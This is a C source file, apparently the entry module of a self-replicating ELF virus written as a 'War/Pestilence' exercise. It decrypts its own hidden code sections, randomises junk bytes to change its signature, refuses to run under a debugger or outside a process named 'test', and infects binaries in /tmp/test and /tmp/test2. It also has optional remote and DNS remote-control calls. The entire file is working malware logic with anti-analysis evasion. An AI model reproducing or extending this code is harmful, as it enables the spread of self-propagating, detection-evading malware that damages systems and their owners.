#include <elf.h>
#include "infect.h"
#include "ft_lib.h"
#include "hacks.h"
#include "pos.h"
#include "table.h"

#define PUT(X) {char c = X;CALL(SYS_write, 2, &c, 1);}

int main(int ac, char **av) asm ("entry");

extern struct s_opt opt;

extern uint64_t iscompressed;
extern char test_area;
extern char   key[16];
extern uint64_t seed;
extern uint64_t fingerprint;

//======================== WAR ===============================

uint32_t ft_rand(){
	seed = ((uint64_t)seed * 48271u) % 0x7fffffff;
	return seed;
}

void ft_srand(){
	seed = fingerprint;
}

int _replace_jmp_gb(Garbage g){
	debug_ext("(at pos ", g.off, ") ");

	//if (&bin_start + g.off + g.len >= &bin_end) return FALSE;

	unsigned char *p = ((unsigned char *)(&bin_start)) + g.off + 2;
	int n = g.len - 2;
	debug_ext(".jmp +", n, ": ");
	for (int i = 0; i < n; i++){
		debug_ext(".byte ", p[i], ", ");
		p[i] = (unsigned char)ft_rand();
	}
	return TRUE;
}

void change_garbage_code(){
	ft_srand();
	//print("now: ");printnbln(garbage_table_len);
	int x = (size_t)(&cmpr_start) - (size_t)(&bin_start);
	debug_ext("zone 1:", 0," to ", x-1, " (start, encrypt routine, ...)\n");
	int x2 = (size_t)(&crypt_start) - (size_t)(&bin_start);
	debug_ext("zone 2:", x," to ", x2-1, " (compression routine, ...)\n");
	int x3 = (size_t)(&crypt_end) - (size_t)(&bin_start);
	debug_ext("zone 3:", x2," to ", x3-1, " (main, infection routine, ...)\n");

	debug_ext("=========== CHECK garbage codes ===========\n", 0, ": ");
	for (size_t i = 0 ; i < garbage_table_len-2; i++){
		_replace_jmp_gb(garbage_table[i]);
		if (i+1 != garbage_table_len-2)
		debug_ext("\n", i+1, ": ");
	}
	debug_ext("\n=========== END CHECK garbage codes =======\nGot:", garbage_table_len, "\n");
}

//======================= PESTILENCE =========================

int __start decryptHiddenCode(){
	uint32_t *k = (uint32_t *)key;
	//-- decrypt z2        ------
	if (decrypt(&cmpr_start, ((size_t)&cmpr_end) - ((size_t)&cmpr_start), k, FALSE) == -1)
		return FALSE;

	//-- decrypt z3        ------
	char *s = ((char*)&crypt_start);
	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
	if (decrypt(s,n,k, iscompressed) == -1)
		return FALSE;

	//-- decrypt test area ------
	if (decrypt(&test_area,15,k, FALSE) == -1)
		return FALSE;
	//check test area
	for (int i = 0; i < 15; i++)
		if ((&test_area)[i] != 'A')
			return FALSE;
	return TRUE;
}

//=============================================================

void do_infection(){
        char *virus = (char *)&bin_start;
        size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);

        size_t cmpr_off = ((size_t)&cmpr_start) - ((size_t)&bin_start);
        size_t cmpr_len = ((size_t)&cmpr_end) - ((size_t)&cmpr_start);

        size_t crypt_off = ((size_t)&crypt_start) - ((size_t)&bin_start);
        size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);

	infect_dir("/tmp/test", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len}, opt);
	infect_dir("/tmp/test2", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len}, opt);
}

int virus(int ac, char **av){
	debug("Virus");
	if (opt.do_remote) remote();
	if (opt.do_dns_remote)
		dns_remote();
 	if (opt.print_msg) println("[I am a bad virus]");

	change_garbage_code();
	do_infection();
	return TRUE;
}

__start void print_debugging(){
		char s[14];
		s[ 0] = 'D';
		s[ 1] = 'E';
		s[ 2] = 'B';
		s[ 3] = 'U';
		s[ 4] = 'G';
		s[ 5] = 'G';
		s[ 6] = 'I';
		s[ 7] = 'N';
		s[ 8] = 'G';
		s[ 9] = '.';
		s[10] = '.';
		s[11] = '.';
		s[12] = '\n';
		s[13] = '\0';
		CALL(SYS_write, 1, s, 13);
}

__start int main(int ac, char **av){
	char cmp[5];
	cmp[0] = 't';
	cmp[1] = 'e';
	cmp[2] = 's';
	cmp[3] = 't';
	cmp[4] = '\0';
	if (checkproc(cmp) == FALSE)
		return FALSE;
	//key[0] ^= 0b01110010;
	if (checkdebug() == 0)
		return decryptHiddenCode() && virus(ac, av);
	else
		print_debugging();
	return (0);
}
